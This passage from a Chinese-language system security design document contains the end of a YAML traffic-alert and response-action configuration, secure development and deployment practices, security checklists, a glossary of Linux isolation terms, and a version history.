      condition: network[outbound_bytes] > 1GB in 1h
      severity: medium
      action:
        - rate_limit
        - notify_admin
  
  # 响应动作
  actions:
    block_user:
      type: user_block
      duration: 30m
    
    block_access:
      type: access_block
      duration: 1h
    
    throttle:
      type: rate_limit
      requests_per_second: 10
    
    notify_admin:
      type: notification
      channels:
        - email: admin@example.com
        - slack: security-alerts
```

---

## 五、安全最佳实践

### 5.1 开发阶段

1. **安全编码规范**
   - 使用参数化查询，防止注入攻击
   - 验证所有用户输入
   - 使用安全的随机数生成器
   - 避免使用 `eval()`、`exec()` 等危险函数

2. **代码审查**
   - 所有代码必须经过安全审查
   - 使用自动化安全扫描工具
   - 定期进行代码安全培训

3. **依赖管理**
   - 定期更新依赖包
   - 使用安全的依赖版本
   - 监控依赖漏洞公告

### 5.2 部署阶段

1. **最小化安装**
   - 移除不必要的软件包
   - 禁用不必要的服务
   - 使用最小化基础镜像

2. **配置加固**
   - 使用强密码策略
   - 启用防火墙
   - 配置 SELinux/AppArmor

3. **密钥管理**
   - 使用密钥管理服务
   - 定期轮换密钥
   - 不在代码中硬编码密钥

### 5.3 运维阶段

1. **监控和告警**
   - 监控系统资源使用
   - 监控异常访问模式
   - 配置实时告警

2. **日志管理**
   - 集中式日志收集
   - 日志完整性保护
   - 定期日志审计

3. **应急响应**
   - 制定应急响应计划
   - 定期进行安全演练
   - 建立安全事件报告流程

---

## 六、安全检查清单

### 6.1 部署前检查

- [ ] 所有安全配置已应用
- [ ] 密钥已正确管理
- [ ] 防火墙规则已配置
- [ ] 文件权限已设置
- [ ] 审计日志已启用
- [ ] 监控告警已配置

### 6.2 运行时检查

- [ ] 资源使用在限制范围内
- [ ] 无异常进程运行
- [ ] 网络连接正常
- [ ] 日志记录正常
- [ ] 安全策略生效

### 6.3 定期检查

- [ ] 依赖包已更新
- [ ] 安全补丁已应用
- [ ] 密钥已轮换
- [ ] 审计日志已分析
- [ ] 安全策略已审查

---

## 七、附录

### 7.1 术语表

| 术语 | 定义 |
|------|------|
| Landlock | Linux 内核安全模块，用于文件系统访问控制 |
| Seccomp | Linux 系统调用过滤机制 |
| cgroups | Linux 控制组，用于资源限制 |
| namespace | Linux 命名空间，用于隔离 |
| TOCTOU | Time-of-check to time-of-use，竞态条件漏洞 |

### 7.2 参考资源

- [OWASP 安全指南](https://owasp.org/www-project-web-security-testing-guide/)
- [Linux 安全模块文档](https://www.kernel.org/doc/html/latest/security/)
- [CIS 基准](https://www.cisecurity.org/cis-benchmarks/)
- [NIST 安全框架](https://www.nist.gov/cyberframework)

### 7.3 版本历史

| 版本 | 日期 | 作者 | 变更说明 |
|------|------|------|----------|
| 1.0 | 2026-08-29 | - | 初始版本 |